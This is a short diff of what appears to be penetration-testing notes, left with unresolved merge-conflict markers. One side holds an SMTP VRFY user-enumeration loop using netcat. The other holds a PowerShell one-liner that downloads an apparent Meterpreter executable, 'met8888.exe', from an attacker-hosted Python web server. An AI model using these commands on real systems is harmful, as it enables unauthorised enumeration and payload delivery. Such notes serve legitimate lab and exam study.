@@ -143,5 +143,15 @@ nc -nv 10.10.10.51 25
 VRFY bob
 
 
+<<<<<<< HEAD
 for user in $(cat users.txt); do nc -nv IPADDRESS 25; VRFY $user; done
+=======
+#----- Transferring Files from Linux to Windows -----#
+### Python Webserver 
+python -m SimpleHTTPServer
+
+### Transfer to Windows with no broswer
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\name\Desktop\met8888.exe')"
+
+>>>>>>> 13e2e1d7c5bf48c2cc040d1732e2b8118184a462
 
